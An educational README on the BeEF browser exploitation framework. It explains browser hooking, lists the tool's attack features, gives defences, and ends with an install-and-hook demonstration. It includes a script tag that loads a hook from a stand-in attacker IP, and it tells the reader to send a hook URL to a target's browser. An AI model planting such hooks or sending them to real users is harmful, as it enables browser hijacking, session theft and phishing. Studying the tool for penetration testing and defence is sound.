# BeEF Framework
## Introduction
According to [1][1] around 45% of Web users are not updating to the latest versions of their browsers with the up-to-date security measures, which empowers various tools to exploit their browsers' vulnerabilities. BeEF which is the short term of Browser Exploitation Framework, initiated in 2006 by Wade Alcorn is an open-source hacking and penetration testing tool, mainly to perform web browser attacks and exploit vulnerabilities using a capable and simple user interface [2][2]. 
## Browser Exploitation
Generally, an exploit is any code that utilizes vulnrabilities in an operating system or a piece of software to perform malicious actions. Browser or website exploitation takes advantage of a web browser vulnerability and breach a web browser security to alter a user's browser settings without their knowledge [3][3]. 
## What Does BeEF Do?
BeEF evades network security measures and anti-virus applications in the host system by exploiting vulnerabilities in web browsers inside a LAN network [4][4]. It focuses on taking advantage of a web browser’s vulnerabilities to hijack and take control of the target. By “hooking” one or many number of browsers, the attacker starts launching various type of commands that attacks the browser and further attacks the system [4][4]. In order to perform an attack, the attacker generates a customized URL that includes a JavaScript hook and forwards it to the targeted user using emails, social network links and many other possible ways to open it [5]. 
```javascript
<script src="http://Attacker’s_IP_Address:3000/hook.js"></script>
```
Once an unaware user opens the received URL, the browser is hooked without noticing any unusual activity while the attacker accesses the user’s session. Hence, the attacker will have access to the targeted browser and will be able to launch MITM attacks, Social Engineering attacks, Phishing, Cookie Hijacking, Webcam Enabling, Information Gathering, and many other commands that may further attack the host system.
## How Does It Work?
When the attacker starts BeEF, the User Interface and Communication Server are started.

![alt text](https://github.com/yazan828/Test/blob/main/BeEFUI.PNG "BeEF User Interface")

The method BeEF follows to hook web browsers consists of three phases Initiating, Retaining, and Attacking. During initiating, the user opens the received URL and the browser executes the hook that contains instructions to initiate a communication channel between the hooked browser and the attacker. In the retaining phase, an active communication channel is established to start the attacking phase. Using Communication Servers, the attacker is able to communicate with the hooked browsers via HTTP. Lastly, after hooking the browser and establishing an active channel for communication, the attacker can start delivering JavaScript payloads and sending various commands through the User Interface.

![alt text](https://github.com/yazan828/Test/blob/main/Diagram.png "BeEF Attack Scenario [6]")

The figure above demonstrates an overview of a client attack using BeEF by injecting the script into the hook and forwarding it to the target. 
BeEF offers a variety set of features such as [6][6],[7][7]: 
* Key logging
* Using hooked browser as proxy
* Many social engineering techniques
* Integration with Metasploit Framework 
* Phishing attacks

![alt text](https://github.com/yazan828/Test/blob/main/Command.PNG "Various BeEF Commands")
## Who Uses BeEF & Why Is It Useful?
The primary purpose of BeEF is to allow qualified penetration testers to evaluate the security measures of web browsers and examine exploitability by simulating the attacks. However, BeEF is also used by hackers who are either targeting specific victims or spreading hooks through the network to gather sensitive information without consent. Plus, BeEF is continuously being used for educational purposes due to its simplicity and strong capability [4][4]. 
## How To Protect Against BeEF?
To protect a browser against BeEF or any other browser explotation tool, a number  of steps should be taken:
* Continously update you browser:

When a vulnerability in a web browser is found, the vendor often releases a patch to fix the issue causing it. Hence, updating web browser provides protection against more recent exploits.
* Do not click on suspicious links or attachments:

Most social engineering techniques are often used by tricking targets to open URLs to suspicious websites. Hence, verifying that an attachment is legitimate is important before clicking it. There are multiple online tools to check if the recieved URL is safe or not such as [11]
* Install firewall and other security software: 

Firewalls act as a strong barrier between the internet and the web browser which detects, blocks suspicious websites, and catches threats before breaching web security 
## Demonstration
This is a short demonstration on how BeEF Framework works on LAN networks. To start, you can install BeEF in few quick steps. (See [8][8] if you encouter any errors)
```console
$ git clone https://github.com/beefproject/beef.git
$ cd /beef
$ ./install
```
Now you are ready to launch BeEF by typing:
```console
$ beef-xss
```
Now, BeEF will start on your coomand line and will open a web user interface
![alt text](https://github.com/yazan828/BeEF-Framework/blob/main/BeEF_Start.png)
![alt text](https://github.com/yazan828/BeEF-Framework/blob/main/BeEF_Authentication.png)
After inserting your credentials, you can now access the user panel.
![alt text](https://github.com/yazan828/BeEF-Framework/blob/main/UI.png)
Send the following hook to the targeted browser
```
http://Your_IP_Address:3000/demos/butcher/index.html
```
Once the user opens the URL, the targeted browser is now hooked
![alt text](https://github.com/yazan828/BeEF-Framework/blob/main/BeEF_Hook.png "Hook Page on Targeted Browser")
![alt text](https://github.com/yazan828/BeEF-Framework/blob/main/BeEF_Hooked.png "Hooked Browser as Seen From the Attacker Panel")

Now, the attacker has access to the target's browser and is able to send many different commands from the commands window.
## Additional Resources
As mentioned before, the actual version of BeEF Framework works only over LAN Networks. Hence, some developers have developed tools that facilitate with BeEF to operate remotely over WAN such as [9][9],[10][10]


[1]: https://writingbros.com/essay-examples/an-in-depth-look-at-browser-exploitation-using-beef-framework/
[2]: https://github.com/beefproject/beef/wiki#overview
[3]: https://www.ericom.com/whatis/browser-exploit/
[4]: https://www.researchgate.net/publication/322398374_Web_Browser_Attack_Using_BeEF_Framework
[5]: https://www.secureideas.com/blog/2013/06/getting-started-with-beef-browser.html#:~:text=BeEF%2C%20the%20Browser%20Exploitation%20Framework,environment%2C%20bypassing%20the%20hardened%20perimeter.
[6]: https://ro.ecu.edu.au/cgi/viewcontent.cgi?article=1131&context=adf
[7]: https://github.com/beefproject/beef/wiki/How-BeEF-Works
[8]: https://github.com/beefproject/beef
[9]: https://github.com/AzizKpln/Beef-Over-AWS
[10]: https://github.com/stormshadow07/BeeF-Over-Wan
[11]: https://search.google.com/search-console/welcome?action=inspect&utm_medium=referral&utm_campaign=9012289
